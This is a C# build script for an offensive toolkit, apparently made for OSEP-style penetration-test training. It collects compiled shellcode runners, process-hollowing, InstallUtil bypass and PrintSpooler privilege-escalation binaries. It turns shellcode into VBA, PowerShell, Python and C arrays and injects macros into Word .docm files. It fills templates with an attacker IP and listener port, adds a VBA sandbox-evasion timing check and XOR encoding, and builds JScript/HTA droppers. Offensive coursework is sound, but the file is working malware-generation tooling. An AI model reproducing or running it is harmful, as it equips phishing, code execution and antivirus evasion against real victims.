using Aspose.Words;
using Aspose.Words.Saving;
using Aspose.Words.Vba;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using static System.Net.Mime.MediaTypeNames;
using Word = Microsoft.Office.Interop.Word;



//I just want the world to know that I wrote this by hand. Then AI told me I sucked and rewrote it better. Then I ruined it again.

//This project builds last, converts shellcode syntax, populates templates, and moves all the artifacts to a unified location.

namespace Build
{
    internal class build
    {




        private static int Main(string[] args)
        {
            


            Console.WriteLine("\n\n\n[START BUILD]");

            Console.WriteLine("[+] Gathering artifacts...");
            GatherArtifacts(args);

            Console.WriteLine("[+] Injecting Macros into Word documents...");
            GenerateWordDocuments(args);

            Console.WriteLine("[+] Generating script Templates...");
            GenerateScripts(args);


            if (CONFIG.ENCODED)
            {
                Console.WriteLine("Restoring orginal shellcode...");
                CONFIG.DecodeCONFIG();
            }
            

            return 0;
        }

        public static string ConvertByteCode(byte[] shellcode, ByteCodeLang bcl)
        {
            StringBuilder sb = new StringBuilder();

            string varname = CONFIG.SHELLCODE_NAME;
            int width = 30;
            int count = 0;

            if (bcl == ByteCodeLang.python)
            {
                sb.Append($"{varname} = b\"\"\n");

            } else if (bcl == ByteCodeLang.vba) {
                sb.Append($"{varname} = Array(");

            }
            else if (bcl == ByteCodeLang.c)
            {
                sb.Append($"unsigned char {varname}[] = \n");

            }
            else if (bcl == ByteCodeLang.ps1)
            {
                sb.Append($"[Byte[]] ${varname} = ");

            }


            foreach (byte b in shellcode)
            {
                //Write newline prefix if new line
                if (count == 0)
                {
                    if (bcl == ByteCodeLang.python)
                    {
                        sb.Append($"{varname} += b\"");

                    }
                    else if (bcl == ByteCodeLang.c)
                    {
                        sb.Append($"\"");

                    }
                }

                //write bytes formatted
                if (bcl == ByteCodeLang.python)
                {
                    sb.Append($"\\x{b.ToString("x2")}");

                }
                else if (bcl == ByteCodeLang.vba)
                {
                    sb.Append($"{(int)b},");

                }
                else if (bcl == ByteCodeLang.c)
                {
                    sb.Append($"\\x{b.ToString("x2")}");

                }
                else if (bcl == ByteCodeLang.ps1)
                {
                    sb.Append($"0x{b.ToString("x2")},");

                }


                //deal with max line width.
                if (count == width)
                {
                    if (bcl == ByteCodeLang.python)
                    {
                        sb.Append($"\"\n");
                    }
                    else if (bcl == ByteCodeLang.c)
                    {
                        sb.Append($"\"\n");

                    }
                    else if (bcl == ByteCodeLang.vba)
                    {
                        sb.Append($" _\n");

                    }


                    count = 0;
                    continue;
                }

                count++;

            }

            //write last line closure
            if (bcl == ByteCodeLang.python)
            {
                sb.Append($"\"\n");
            }
            else if (bcl == ByteCodeLang.vba)
            {
                string sbt = sb.ToString().TrimEnd(',');
                sb.Clear();
                sb.Append(sbt);
                sb.Append($")");

            }
            else if (bcl == ByteCodeLang.c)
            {
                sb.Append($"\"");

            }
            else if (bcl == ByteCodeLang.ps1)
            {
                string sbt = sb.ToString().TrimEnd(',');
                sb.Clear();
                sb.Append(sbt);
                sb.Append($"");

            }


            return sb.ToString();
        }

    

        private static void GatherArtifacts(string[] args)
        {

            //First lets define our artifacts. Where they are, their name, and any supplemetary info.
            List<Artifact> artifacts = new List<Artifact>();


            //artifacts.Add(new Artifact("LOCATION", "NAME", ArtifactType.?));
            artifacts.Add(new Artifact("DLL Execute Assembly Dynamic", "ea-dy.dll", ArtifactType.Bypass));
            artifacts.Add(new Artifact("DLL Execute Assembly Static", "ea-st.dll", ArtifactType.Bypass));
            artifacts.Add(new Artifact("DLL Invoke Shellcode", "invoke-sc.dll", ArtifactType.Fundamental));
            artifacts.Add(new Artifact("DLL Native PowerShell Runspace Static", "native-ps-rs-st.dll", ArtifactType.Bypass));
            artifacts.Add(new Artifact("DLL PowerShell Runspace Dynamic", "ps-rs-dy.dll", ArtifactType.Bypass));
            artifacts.Add(new Artifact("DLL PowerShell Runspace Reflection Dynamic", "ps-rs-rf-dy.dll", ArtifactType.Bypass));
            artifacts.Add(new Artifact("DLL PowerShell Runspace Reflection Static", "ps-rs-rf-st.dll", ArtifactType.Bypass));
            artifacts.Add(new Artifact("DLL PowerShell Runspace Static", "ps-rs-st.dll", ArtifactType.Bypass));
            artifacts.Add(new Artifact("DLL Sideload Proxy", "sideload.dll", ArtifactType.PrivEsc));
            artifacts.Add(new Artifact("EXE Elevation PrintSpool", "el-printspool.exe", ArtifactType.PrivEsc));
            artifacts.Add(new Artifact("EXE Hollow Shellcode", "hollow-sc.exe", ArtifactType.Fundamental));


            artifacts.Add(new Artifact("EXE InstallUtil Execute Assembly Dynamic", "iu-ea-dy.exe", ArtifactType.Bypass));
            artifacts.Add(new Artifact("EXE InstallUtil Execute Assembly Static", "iu-ea-st.exe", ArtifactType.Bypass));

            artifacts.Add(new Artifact("EXE InstallUtil InvokeReflection DLL Dynamic", "iu-invokereflection-dy.exe", ArtifactType.Bypass));

            artifacts.Add(new Artifact("EXE InstallUtil PowerShell Runspace Dynamic", "iu-ps-rs-dy.exe", ArtifactType.Bypass));
            artifacts.Add(new Artifact("EXE InstallUtil PowerShell Runspace Reflection Dynamic", "iu-ps-rs-rf-dy.exe", ArtifactType.Bypass));
            artifacts.Add(new Artifact("EXE InstallUtil PowerShell Runspace Reflection Dynamic", "iu-ps-rs-rf-st.exe", ArtifactType.Bypass));
            artifacts.Add(new Artifact("EXE InstallUtil PowerShell Runspace Static", "iu-ps-rs-st.exe", ArtifactType.Bypass));

            artifacts.Add(new Artifact("EXE Minidump", "minidump.exe", ArtifactType.Tools));

            artifacts.Add(new Artifact("EXE Run Shellcode", "run-sc.exe", ArtifactType.Fundamental));

            artifacts.Add(new Artifact("HelperTool", "OSEP-Helper.exe", ArtifactType.Tools));



            string solution_dir = args[0];

            //Prep dir structure
            try { Directory.Delete($"{solution_dir}\\ARTIFACTS", true); } catch {  }
            Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS");
            Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\docm");
            //Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\docm\\vba");

            foreach (ArtifactType at in Enum.GetValues(typeof(ArtifactType)))
            {
                Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\{at}");
            }
            

            foreach (Artifact a in artifacts)
            {
                try
                {
                    Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}");



                    //These next set of blocks are just moving artifacts to appropriate spots and bringing the readmes with them.
                    if (File.Exists($"{solution_dir}\\{a.LocationBase}\\bin\\x64\\result.exe"))
                    {
                        Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\x64");
                        File.Copy($"{solution_dir}\\{a.LocationBase}\\bin\\x64\\result.exe", $"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\x64\\{a.FileName}");

                        CopyReadme(solution_dir, a, "x64");
                        CopyDependencies(solution_dir, a, "x64");
                    }

                    if (File.Exists($"{solution_dir}\\{a.LocationBase}\\bin\\x86\\result.exe"))
                    {
                        Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\x86");
                        File.Copy($"{solution_dir}\\{a.LocationBase}\\bin\\x86\\result.exe", $"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\x86\\{a.FileName}");

                        CopyReadme(solution_dir, a, "x86");
                        CopyDependencies(solution_dir, a, "x86");
                    }

                    if (File.Exists($"{solution_dir}\\{a.LocationBase}\\bin\\x64\\result.dll"))
                    {
                        Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\x64");
                        File.Copy($"{solution_dir}\\{a.LocationBase}\\bin\\x64\\result.dll", $"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\x64\\{a.FileName}");

                        CopyReadme(solution_dir, a, "x64");
                        CopyDependencies(solution_dir, a, "x64");
                    }

                    if (File.Exists($"{solution_dir}\\{a.LocationBase}\\bin\\x86\\result.dll"))
                    {
                        Directory.CreateDirectory($"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\x86");
                        File.Copy($"{solution_dir}\\{a.LocationBase}\\bin\\x86\\result.dll", $"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\x86\\{a.FileName}");

                        CopyReadme(solution_dir, a, "x86");
                        CopyDependencies(solution_dir, a, "x86");
                    }



                }
                catch (Exception ex)
                {
                    
                    Console.WriteLine($"\nError: {ex.Message}\n");
                    
                }
            }






        }

        private static void CopyReadme(string solution_dir, Artifact a, string arch)
        {
            if (File.Exists($"{solution_dir}\\{a.LocationBase}\\README.md"))
            {
                File.Copy($"{solution_dir}\\{a.LocationBase}\\README.md", $"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\{arch}\\README.md");
            }
        }

        private static void CopyDependencies(string solution_dir, Artifact a, string arch)
        {
            string[] files = Directory.GetFiles($"{solution_dir}\\{a.LocationBase}\\bin\\{arch}");

            foreach (string file in files)
            {
                FileInfo fi = new FileInfo(file);

                if (fi.Extension == ".dll" && !fi.Name.Contains("result"))
                {
                    try
                    {
                        File.Copy(file, $"{solution_dir}\\ARTIFACTS\\{a.ArtifactType}\\{Name2Dir(a.FileName)}\\{arch}\\{fi.Name}");
                    }
                    catch { }
                    
                }
            }
        }

        private static string Name2Dir(string input)
        {
            //convert shorthand file name to full text
            string[] parts = input.Split('.');
            string output = parts[0];

            if (parts[1] == "dll")
            {
                output = "DLL " + output;
            }
            else
            {
                output = "EXE " + output;
            }

            output = output.Replace("iu-","InstallUtil ");
            output = output.Replace("sc-", "Shellcode ");
            output = output.Replace("ps-", "PowerShell ");
            output = output.Replace("rs-", "Runspace ");
            output = output.Replace("el-", "Elevate ");
            output = output.Replace("call-", "Callback ");
            output = output.Replace("ea-", "Execute-Assembly ");
            output = output.Replace("dy-", "Dynamic ");
            output = output.Replace("st-", "Static ");
            output = output.Replace("rf-", "Reflection ");

            output = output.Replace("-iu", " InstallUtil");
            output = output.Replace("-sc", " Shellcode");
            output = output.Replace("-ps", " PowerShell");
            output = output.Replace("-rs", " Runspace");
            output = output.Replace("-el", " Elevate");
            output = output.Replace("-call", " Callback");
            output = output.Replace("-ea", " Execute-Assembly");
            output = output.Replace("-dy", " Dynamic");
            output = output.Replace("-st", " Static");
            output = output.Replace("-rf", " Refelction");

            output = output.Replace("iu ", "InstallUtil ");
            output = output.Replace("sc ", "Shellcode ");
            output = output.Replace("ps ", "PowerShell ");
            output = output.Replace("rs ", "Runspace ");
            output = output.Replace("el ", "Elevate ");
            output = output.Replace("call ", "Callback ");
            output = output.Replace("ea ", "Execute-Assembly ");
            output = output.Replace("dy ", "Dynamic ");
            output = output.Replace("st ", "Static ");
            output = output.Replace("rf ", "Reflection ");

            output = output.Replace(" iu", " InstallUtil");
            output = output.Replace(" sc", " Shellcode");
            output = output.Replace(" ps", " PowerShell");
            output = output.Replace(" rs", " Runspace");
            output = output.Replace(" el", " Elevate");
            output = output.Replace(" call", " Callback");
            output = output.Replace(" ea", " Execute-Assembly");
            output = output.Replace(" dy", " Dynamic");
            output = output.Replace(" st", " Static");
            output = output.Replace(" rf", " Reflection");

            output = output.Replace("-", " ");

            return output;
        }

        private static void GenerateScripts(string[] args)
        {
            //This function is going to copy all the scripts in Templates to Artifacts.
            //However, it will first remove all the template palceholders.


            //Ensure the Artifacts dir exists
            if (!Directory.Exists($"{args[0]}\\ARTIFACTS\\scripts"))
            {
                Directory.CreateDirectory($"{args[0]}\\ARTIFACTS\\scripts");
            }else
            {
                Directory.Delete($"{args[0]}\\ARTIFACTS\\scripts",true);
                Directory.CreateDirectory($"{args[0]}\\ARTIFACTS\\scripts");
            }


            string[] files = Directory.GetFiles($"{args[0]}\\Templates");
            foreach (string f in files)
            {
                FileInfo fi = new FileInfo(f);
                string text = DeTemplate(File.ReadAllText(fi.FullName),fi,args);

                //Write to artifacts folder
                string nf = f.Replace("Templates", "ARTIFACTS\\scripts");
                File.WriteAllText(nf, text);
            }





            //DotNetToJsTemplates
            if (!IsDefenderRealTimeProtectionEnabled())
            {
                Console.WriteLine("*** Starting DotNet 2 Jscript ***");
                string dn2js_location = $"{args[0]}\\DotNetToJScript\\bin\\x64\\DotNetToJScript.exe";
                string dll_location = $"{args[0]}\\ARTIFACTS\\Fundamental\\DLL invoke Shellcode\\x64\\invoke-sc.dll";
                string out_location = $"{args[0]}\\ARTIFACTS\\scripts\\rundll_invokable.js";
                string cmdline = $"{dn2js_location} \"{dll_location}\" --lang=Jscript --ver=v4 -o \"{out_location}\" -c OSEP.OSEPRunner";
                Console.WriteLine(cmdline);
                RunProccess(cmdline);



                //build hta files
                string js = File.ReadAllText($"{args[0]}\\ARTIFACTS\\scripts\\rundll_invokable.js");
                string tmp = File.ReadAllText($"{args[0]}\\templates\\invoke_dll.hta");
                string result = tmp.Replace("{JSCODE}", js);
                File.WriteAllText($"{args[0]}\\ARTIFACTS\\scripts\\invoke_dll.hta",result);
            }
            else
            {
                Console.WriteLine("\nWARNING: MS DEFENDER is enabled. DotNetToJScript will not run...");
            }
               
        }

        public static void GenerateWordDocuments(string[] args)
        {
            //This function will search for macro templates and begin injecting them into the word docm template as copies
            
            //Directory variables
            string baseDir = Path.GetFullPath(args[0]);
            string searchDir = baseDir + @"\Templates\vba\";
            string outputDir = baseDir + @"\ARTIFACTS\docm\";


            //Flush output directory.
            if (Directory.Exists(outputDir))
            {
                Directory.Delete(outputDir, true);
                Directory.CreateDirectory(outputDir);
                Directory.CreateDirectory(outputDir + "vba");
            }



            //Find all files
            string[] files = Directory.GetFiles(searchDir);


            //iterate over all files.
            foreach (string file in files)
            {
                //exit if not vba file
                if (!file.EndsWith(".vba"))
                    continue;

                //build output file name
                FileInfo fi = new FileInfo(file);
                string outFile = outputDir + fi.Name.Replace(".vba", "") + ".docm";

                //Remove template palceholders
                string macroText = DeTemplate(File.ReadAllText(file),fi, args);

                //File.Create(outputDir + @"vba\" + fi.Name);
                File.WriteAllText(outputDir + @"vba\" + fi.Name, macroText);

                //Inject the macro and save to output file.
                InjectMacro(file, outFile, macroText);
            }



        }

        public static void InjectMacro(string inputPath, string outputPath, string macroText)
        {
            //ChatGPT and Aspose.Word ... I command you to lead me to great victory!!!!

            //I didn't write this function.
            //It works, but could probably be improved.


            var document = new Document(inputPath);

            // Create a VBA project if the document does not already contain one.
            if (document.VbaProject == null)
            {
                document.VbaProject = new VbaProject
                {
                    Name = "NewMacros"
                };
            }

            string moduleName = CONFIG.MACRO_NAME;


            VbaModule module = document.VbaProject.Modules[moduleName];

            if (module == null)
            {
                module = new VbaModule
                {
                    Name = moduleName,
                    Type = VbaModuleType.ProceduralModule,
                    SourceCode = macroText
                };

                document.VbaProject.Modules.Add(module);
            }
            else
            {
                // Replace the code if the module already exists.
                module.SourceCode = macroText;
            }

            document.Save(
                outputPath,
                new OoxmlSaveOptions(SaveFormat.Docm));
        }
    
        public static string DeTemplate(string Input, FileInfo fi, string[] args)
        {
            //This will remove template placeholders from a string.

            string output = Input;

            //because we are running this multiple times (Just incase there are template palceholders inside of templates)
            //This flag prevents literal functions from being written to the doc multiple times.
            bool FunctionsAdded = false;

            for (int i=0;i<=5;i++)
            {

                output = output.Replace("{MACRO_NAME}", CONFIG.MACRO_NAME);
                output = output.Replace("{HTTP_URL}", CONFIG.HTTP_URL);
                output = output.Replace("{BINARY_NAME}", CONFIG.BINARY_NAME);
                output = output.Replace("{WAIT_TIME_SECONDS}", CONFIG.WAIT_TIME_SECONDS);
                output = output.Replace("{POWERSHELL_SCRIPT_NAME}", CONFIG.POWERSHELL_SCRIPT_NAME);
                output = output.Replace("{SHELLCODE_NAME}", CONFIG.SHELLCODE_NAME);
                output = output.Replace("{INSTALL_UTIL_EXE_PATH}", CONFIG.INSTALL_UTIL_EXE_PATH);
                output = output.Replace("{ATTACKER_IP}", CONFIG.ATTACKER_IP);
                output = output.Replace("{LPORT}", CONFIG.LPORT);



                //This block should only run once in theory.
                if (!FunctionsAdded)
                {

                    //This block is going to add a simple time check to any VBA macros
                    if (CONFIG.DETECT_SANDBOX_TIME)
                    {
                        StringBuilder sb = new StringBuilder();
                        if (fi.Extension == ".vba")
                        {
                            sb.AppendLine($"    Dim t1 As Date");
                            sb.AppendLine($"    Dim t2 As Date");
                            sb.AppendLine($"    Dim time As Long");
                            sb.AppendLine($"    t1 = Now()");
                            sb.AppendLine($"    Sleep (2000)");
                            sb.AppendLine($"    t2 = Now()");
                            sb.AppendLine($"    time = DateDiff(\"s\", t1, t2)");
                            sb.AppendLine($"    If time < 2 Then");
                            sb.AppendLine($"        Exit Function");
                            sb.AppendLine($"    End If");
                        }

                        output = output.Replace("{DETECT_SANDBOX_TIME}", sb.ToString());
                    }
                    else
                    {
                        output = output.Replace("{DETECT_SANDBOX_TIME}", "");
                    }

                    //Adds custom decode block to ps1 files if needed.
                    if (fi.Extension == ".ps1")
                    {
                        if (CONFIG.ENCODED)
                        {
                            string ff = $"{args[0]}\\Templates\\tmp_ps_decode_func.txt";
                            string func = File.ReadAllText(ff);
                            output = func + "\n\n" + output;
                        }
                    }


                    //Lets only do this once per file.
                    FunctionsAdded = true;
                }


                //Convert shellcode strings to appropriate language
                if (fi.Extension == ".ps1")
                {
                    output = output.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE64, ByteCodeLang.ps1));
                    output = output.Replace("{SHELLCODE86}", ConvertByteCode(CONFIG.SHELLCODE86, ByteCodeLang.ps1));

                    if (CONFIG.ENCODED)
                    {
                        output = output.Replace("{DECODE}", $"${CONFIG.SHELLCODE_NAME} = Decode-Buffer -InputBuffer ${CONFIG.SHELLCODE_NAME} -Key ([byte]0x{CONFIG.KEY.ToString("X2")})");
                    }

                }
                else if (fi.Extension == ".vba")
                {
                    string dcf = $"{args[0]}\\Templates\\tmp_vba_decode_func.txt";
                    output = output.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE64, ByteCodeLang.vba));
                    output = output.Replace("{SHELLCODE86}", ConvertByteCode(CONFIG.SHELLCODE86, ByteCodeLang.vba));

                    if (CONFIG.ENCODED)
                    {
                        output = output.Replace("{DECODE_VBA_FUNC}", File.ReadAllText(dcf));
                        output = output.Replace("{DECODE}", $"buf = Decode({CONFIG.SHELLCODE_NAME}, {$"&H{CONFIG.KEY:X2}"})");
                    } else
                    {
                        output = output.Replace("{DECODE_VBA_FUNC}", "");
                        output = output.Replace("{DECODE_VBA_VAR}", "");
                        output = output.Replace("{DECODE}", "");
                    }
                    

                }
                else if (fi.Extension == ".py")
                {
                    output = output.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE64, ByteCodeLang.python));
                    output = output.Replace("{SHELLCODE86}", ConvertByteCode(CONFIG.SHELLCODE86, ByteCodeLang.python));
                }
                else if (fi.Extension == ".c" || fi.Extension == ".cpp" || fi.Extension == ".h" || fi.Extension == ".hpp")
                {
                    output = output.Replace("{SHELLCODE}", ConvertByteCode(CONFIG.SHELLCODE64, ByteCodeLang.c));
                    output = output.Replace("{SHELLCODE86}", ConvertByteCode(CONFIG.SHELLCODE86, ByteCodeLang.c));
                }

                output = output.Replace("{DECODE}", "");


            }


            return output;
        }

        public static bool IsDefenderRealTimeProtectionEnabled()
        {
            //AI Gen
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"Get-CimInstance -Namespace root/Microsoft/Windows/Defender -ClassName MSFT_MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled\"";
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.CreateNoWindow = true;

            using (Process p = Process.Start(psi))
            {
                string output = p.StandardOutput.ReadToEnd().Trim();
                string error = p.StandardError.ReadToEnd().Trim();

                p.WaitForExit();

                if (p.ExitCode != 0)
                    throw new Exception("PowerShell error: " + error);

                return output.Equals("True", StringComparison.OrdinalIgnoreCase);
            }
        }

        public static void RunProccess(string cmdline)
        {
            ProcessStartInfo psi = new ProcessStartInfo();

            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + cmdline;
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = false;
            psi.RedirectStandardError = false;
            psi.CreateNoWindow = true;

            using (Process p = new Process())
            {
                p.StartInfo = psi;

                p.Start();

                //string stdout = p.StandardOutput.ReadToEnd();
                //string stderr = p.StandardError.ReadToEnd();

                p.WaitForExit();

            }
        }

        


    }

    public enum ByteCodeLang
    {
        vba, c, ps1, python

    }

    public enum ArtifactType
    {
        Tools, PrivEsc, Bypass, Fundamental
    }

    public class Artifact
    {
        public string LocationBase { get; set; }
        public string FileName { get; set; }
        public ArtifactType ArtifactType { get; set; }

        //Constructor

        public Artifact(string locBase, string locName, ArtifactType locType)
        {
            LocationBase = locBase;
            FileName = locName;
            ArtifactType = locType;
        }
    }





}